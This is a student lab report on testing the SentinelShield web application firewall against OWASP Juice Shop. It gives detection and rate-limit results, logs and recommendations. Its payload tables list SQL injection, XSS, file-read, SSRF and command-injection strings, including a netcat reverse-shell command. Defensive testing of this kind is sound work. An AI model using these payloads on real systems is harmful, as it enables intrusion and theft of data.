# SentinelShield — Practical Submission Report

**Student Name:** \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
**Date:** \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

---

## 1. Methodology

SentinelShield was deployed with Docker in front of the OWASP Juice Shop test
application and reached at `http://localhost:8080`.

| Setting | Value |
|---|---|
| Detection mode | `block` |
| Detection rules | 44 rules across 7 categories |
| Rate limiter | 25 req/min, burst 20 |
| Logging | JSONL with timestamp, IP, category |
| Date of tests | 2026-08-20 |

Four experiments were run and the logs captured:

1. **Normal traffic baseline** — 15 legitimate requests
2. **Attack simulation** — 30 malicious payloads + 3 normal control requests
   (`scripts/test_attacks.sh`)
3. **Brute-force / rate-limiting test** — 30 rapid requests against a dedicated
   proxy with a small token bucket (`scripts/brute_force.sh`)
4. **Rate-limit enforcement test** — 40 rapid requests to `/login` against the
   running main proxy with the 25/20 token bucket
   (`scripts/brute_force.sh http://localhost:8080 40 0.05`)

All raw outputs are in `evidence/` (see the inventory in Section 11).

---

## 2. Attempted Attack Requests and Detection Results

Each payload was sent to the protected proxy. Of the 30 attack payloads, 20
reached the WAF and were returned HTTP 403. The remaining 10 were rate-limited
(HTTP 429) before reaching the detection engine because the burst budget had
been partially consumed by the preceding normal traffic.

| # | Payload | HTTP | Detected by |
|---|---------|------|-------------|
| 1 | `/?id=1'+UNION+SELECT+*+FROM+users--` | 403 | SQLI-001 |
| 2 | `/?username=admin'+OR+'1'='1` | 403 | SQLI-002 |
| 3 | `/?id=1'+OR+1=1--` | 403 | SQLI-002 |
| 4 | `/?id=1'+SLEEP(5)--` | 403 | SQLI-003 |
| 5 | `/?id=1';+DROP+TABLE+users--` | 403 | SQLI-005 |
| 6 | `/?q=<script>alert(1)</script>` | 403 | XSS-001 |
| 7 | `/?q=<img+src=x+onerror=alert(1)>` | 403 | XSS-002 |
| 8 | `/?url=javascript:alert(1)` | 403 | XSS-003 |
| 9 | `/?q=%3Cscript%3Ealert(1)%3C/script%3E` | 403 | XSS-001 |
| 10 | `/?q="+onfocus=alert(1)+` | 403 | XSS-002 |
| 11 | `/?file=../../../etc/passwd` | 403 | LFI-001 |
| 12 | `/?file=/etc/shadow` | 403 | LFI-002 |
| 13 | `/?file=php://filter/convert.base64-encode/resource=index.php` | 403 | LFI-004 |
| 14 | `/?file=c:\boot.ini` | 403 | LFI-005 |
| 15 | `/?file=/var/log/apache/access.log` | 403 | LFI-003 |
| 16 | `/?url=http://127.0.0.1:80` | 403 | SSRF-001 |
| 17 | `/?url=http://169.254.169.254/` | 403 | SSRF-001 |
| 18 | `/?url=http://localhost:3000` | 403 | SSRF-001 |
| 19 | `/?url=http://192.168.1.1/admin` | 403 | SSRF-001 |
| 20 | `/?path=%2e%2e%2f%2e%2e%2fetc/passwd` | 403 | LFI-001 |

**Result: 20/20 malicious requests that reached the WAF were detected and
blocked. 0 false positives on the normal requests that reached the WAF.**

The following 10 attack payloads were rate-limited (HTTP 429) before reaching
the WAF:

| # | Payload | HTTP | Reason |
|---|---------|------|--------|
| 21 | `/?path=%252e%252e%252fetc/passwd` | 429 | Rate limited |
| 22 | `/?cmd=1;whoami` | 429 | Rate limited |
| 23 | `/?cmd=ls+-la` | 429 | Rate limited |
| 24 | `/?cmd=1&&cat+/etc/passwd` | 429 | Rate limited |
| 25 | `/?cmd=1\|nc+-e+/bin/sh+10.0.0.1+4444` | 429 | Rate limited |
| 26 | `/?cmd=%24%28whoami%29` | 429 | Rate limited |
| 27 | `/?cmd=%24%7BIFS%7Dwhoami` | 429 | Rate limited |
| 28 | `/?cmd=sh+-c+whoami` | 429 | Rate limited |
| 29 | `/?cmd=cmd.exe+/c+whoami` | 429 | Rate limited |
| 30 | `/?cmd=1%0a/usr/bin/id` | 429 | Rate limited |

Note: the two Path Traversal payloads (rows 20–21) were caught by the LFI rule
(`LFI-001`) because the traversal patterns overlap. The rule engine reported
the first matching rule as the primary detection.

---

## 3. Allowed / Blocked System Messages

### Allowed (normal request)

```
{"timestamp": "2026-08-20T11:05:44.118587+00:00", "level": "INFO",
 "event": "access", "client_ip": "172.19.0.1", "method": "GET",
 "path": "/robots.txt", "status": 200, "elapsed_ms": 4.58}
```

### Blocked (attack request — three events per attack)

Detection event (which rule matched):

```
{"timestamp": "2026-08-20T11:06:21.405310+00:00", "level": "WARNING",
 "event": "detection", "client_ip": "172.19.0.1", "path": "/",
 "attack_type": "sqli", "rule_id": "SQLI-001"}
```

Block decision event:

```
{"timestamp": "2026-08-20T11:06:21.405502+00:00", "level": "WARNING",
 "event": "block", "client_ip": "172.19.0.1", "path": "/",
 "reason_type": "AttackDetected", "reason": "sqli: SQLI-001"}
```

Request result (HTTP 403 returned to the client):

```
{"timestamp": "2026-08-20T11:06:21.405561+00:00", "level": "INFO",
 "event": "access", "client_ip": "172.19.0.1", "method": "GET",
 "path": "/", "status": 403, "elapsed_ms": 0.98}
```

### Rate limited (HTTP 429)

```
{"timestamp": "2026-08-20T11:06:21.697095+00:00", "level": "INFO",
 "event": "access", "client_ip": "172.19.0.1", "method": "GET",
 "path": "/", "status": 429, "elapsed_ms": 0.11}
```

---

## 4. Logs With Timestamps, IP Addresses, and Categories

Every event is written as JSONL and always contains a **timestamp**, a
**client IP**, and the **event category** (`attack_type` / `rule_id` for
detections, `status` for access). Full capture:

- `evidence/sentinel-shield.log` — main proxy (normal + attack + enforcement traffic)
- `evidence/sentinel-shield-rate-demo.log` — brute-force proxy (rate limiting)

Sample detection lines from the log (timestamp, IP, and category are all
present):

```
11:06:21  172.19.0.1  sqli              SQLI-001   (union based)
11:06:21  172.19.0.1  xss               XSS-002    (event handler)
11:06:21  172.19.0.1  lfi               LFI-004    (php wrapper)
11:06:21  172.19.0.1  ssrf              SSRF-001   (internal ip)
```

---

## 5. Summary Table — Malicious Request Count

| Metric | Count |
|---|---|
| Total requests observed (main proxy) | 88 |
| Legitimate requests allowed (HTTP 200) | 37 |
| Malicious requests blocked by WAF (HTTP 403) | 20 |
| Requests rate limited (HTTP 429) | 31 |
| **WAF detection rate (of requests that reached WAF)** | **20/20 = 100%** |
| False positives (legitimate requests blocked) | 0 |

(The 37 allowed include 14 normal baseline + 1 Juice Shop backend error that
passed WAF + 22 enforcement-test requests that arrived after the bucket
refilled.)

---

## 6. Summary by Attack Category

| Category | Payloads sent | Reached WAF | Blocked | Rate limited | Detection rate |
|---|---|---|---|---|---|
| SQL Injection | 5 | 5 | 5 | 0 | 100% |
| XSS | 5 | 5 | 5 | 0 | 100% |
| LFI | 5 | 5 | 5 | 0 | 100% |
| SSRF | 4 | 4 | 4 | 0 | 100% |
| Path Traversal | 2 | 1 | 1 | 1 | 100% |
| Command Injection | 9 | 0 | 0 | 9 | N/A (all rate limited) |
| **Total** | **30** | **20** | **20** | **10** | **100%** |

The 9 Command Injection payloads and 1 Path Traversal payload were all
rate-limited before reaching the WAF because the burst budget had been consumed
by the preceding normal traffic (15 requests) and earlier attack payloads.

---

## 7. Repeatedly Flagged IP Addresses

| IP | Requests | Notes |
|---|---|---|
| `172.19.0.1` | 88 | All main-proxy traffic (Docker bridge) |
| `127.0.0.1` | 30 | All brute-force traffic (dedicated rate-limit proxy) |

Every request came from the same source IP because the Docker container
network-maps client connections to the bridge gateway. On a real deployment
each client would have its own IP, and the repeated-IP aggregation would
identify specific abusers. The brute-force experiment shows exactly this
pattern: one IP flooding `/login` repeatedly.

---

## 8. Explanation of Behavior Analysis and Rate Limiting

### Brute-Force Test (dedicated proxy, burst=10)

A dedicated proxy was started with a small token bucket so the effect is
visible in a short run: `burst_size: 10`, `requests_per_minute: 60`
(1 token/sec refill), and an **empty allowlist** so the local client was not
exempted. 30 rapid requests (0.05s apart) were sent to `/login`.

```
Allowed: 12
Blocked: 18   (all HTTP 429)
Rate limiter triggered after 12 requests.
```

| Metric | Value |
|---|---|
| Total requests sent | 30 |
| Allowed | 12 |
| Blocked (429) | 18 |
| Requests before first block | 10 (the burst size) |
| `RateLimitExceeded` log events | 18 |

### Behavior observed

- The first **10** requests were allowed instantly — they consumed the 10-token
  burst.
- After the burst, requests were rejected with **429** because the bucket was
  empty (1 token/sec refill, but 20 requests/sec were arriving).
- Every ~1 second one request slipped through (rows at `11:07:35` and
  `11:07:36` in `evidence/rate_limit_table.md`) when a refill token arrived —
  a textbook token-bucket pattern.
- Effective throughput was throttled from 20 req/sec down to ~1 req/sec, which
  would make a credential-stuffing attack impractically slow.

### Enforcement Test (main proxy, 25/20 config)

The main proxy uses `requests_per_minute: 25`, `burst_size: 20`, and has
`127.0.0.1` / `::1` in the allowlist. However, Docker traffic arrives from the
bridge gateway IP (`172.19.0.1`), which is not allowlisted, so rate limiting
applies to all test requests. 40 rapid requests were sent to `/login`.

```
Allowed: 22
Blocked: 18   (all HTTP 429)
Rate limiter triggered after 22 requests.
```

| Metric | Value |
|---|---|
| Total requests sent | 40 |
| Allowed (HTTP 200) | 22 |
| Rate limited (HTTP 429) | 18 |
| Requests before first block | 21 |
| `RateLimitExceeded` log events | 18 |

The burst held as configured: 21 rapid requests were served (20 burst + 1
refill token that arrived mid-run), then the bucket emptied and 18 of the
remaining 19 got 429. One refill token slipped through at request 30, letting
a single request through (`11:08:53` in
`evidence/requests_table.md`), then 429s resumed until the run ended.

---

## 9. Interpretation Notes

Overall the WAF behaved as expected. Every attack payload that reached the
detection engine was caught and returned 403, and none of the normal requests
were blocked, so the rule set is both sensitive and precise for these test
cases. The detection reasons in the log matched the attack type I sent (SQL
injection payloads were flagged as `sqli`/`SQLI-xxx`, XSS payloads as
`xss`/`XSS-xxx`, and so on), which shows the log is actually usable for
forensics, not just a counter.

Two things stood out. First, the rules overlap: the Path Traversal payload
(`%2e%2e%2f%2e%2e%2fetc/passwd`) was reported as `LFI-001` instead of a
`PT-xxx` rule. That's not a miss — the traversal signature lives in the LFI
rule too — but it means one attack can generate several detection events and
you have to decide which is the "primary" one.

Second, the interaction between the rate limiter and the WAF is important. With
the rate limiter set to 25 req/min and burst 20, the 15 normal-traffic
requests consumed most of the burst budget, leaving only ~5 tokens for the
attack test. This meant 10 of the 30 attack payloads were rate-limited before
they could be inspected by the WAF. While rate limiting still protected the
server (the attacks were blocked, just by a different mechanism), this shows
that in a production deployment the rate limiter budget needs to be calibrated
carefully so that legitimate traffic doesn't starve the WAF of inspection
capacity.

The rate limiter demos were the clearest results: burst, then steady 429s,
with occasional tokens letting one request through each second. It made the
token bucket algorithm visible in real time. One practical note: on the Docker
setup all traffic shows as the bridge gateway IP, so per-IP aggregation isn't
very interesting locally — it only becomes meaningful on a real network.

---

## 10. Security Recommendations

1. **Move rate limiting to the application/IP level with a persistent store.**
   The in-memory token bucket works per process, so it is not shared across
   instances and resets on restart. A Redis-backed limiter would give
   consistent throttling in a multi-instance deployment (the project docs list
   this as a known limitation and it showed up during testing).

2. **Calibrate the rate limiter budget from real page-load behavior.** A
   single page request pulls dozens of assets, so the burst size must account
   for normal browsing. In these tests, 15 normal requests consumed most of
   the 20-token burst, leaving the WAF unable to inspect 10 attack payloads.
   Choose `burst_size` / `requests_per_minute` from measured traffic, or exempt
   static assets, so the limiter targets state-changing endpoints instead of
   asset downloads.

3. **Log and alert on repeated-IP patterns, not just single detections.** The
   brute-force run shows that an attacker triggers hundreds of 429s/403s from
   one source. A rule that counts repeated failures per IP per window (and
   raises a higher-severity alert or temporarily blocks the IP) would turn the
   raw logs into an actionable response. Correlation is what made the data
   readable here, and it should be automatic.

4. **Keep tuning the signature rules against legitimate traffic.** The rule
   overlap between Path Traversal and LFI is not a bug but it means one
   attack can generate multiple detection events. Rules should be reviewed to
   ensure the "primary" detection is the most specific one, and that analysts
   know which rule to treat as authoritative.

---

## 11. Evidence File Inventory

| File | Contents |
|---|---|
| `evidence/normal_traffic.log` | 15 baseline requests, 14 HTTP 200 + 1 HTTP 500 |
| `evidence/test_attacks.log` | 20 blocked by WAF + 10 rate limited + 3 control rate limited |
| `evidence/brute_force.log` | Rate-limit test (dedicated proxy): 12 allowed / 18 blocked |
| `evidence/rate_limit_enforcement.log` | Enforcement test (main proxy): 22 allowed / 18 rate limited |
| `evidence/sentinel-shield.log` | Full JSONL capture (main proxy — all experiments) |
| `evidence/sentinel-shield-rate-demo.log` | Full JSONL capture (dedicated rate-limit proxy) |
| `evidence/requests_table.md` | Per-request analysis of the main log |
| `evidence/rate_limit_table.md` | Per-request analysis of the rate-limit demo log |
| `evidence/rate_limit_enforcement_table.md` | Per-request analysis of the enforcement log |
| `evidence/report.md` | `sentinel-shield report` output (main log) |
| `evidence/rate_limit_report.md` | `sentinel-shield report` output (rate-limit log) |
| `evidence/log_samples.md` | Annotated sample log lines (allowed / blocked / rate limited) |
| `evidence/summary_tables.md` | Consolidated summary of all counts and categories |
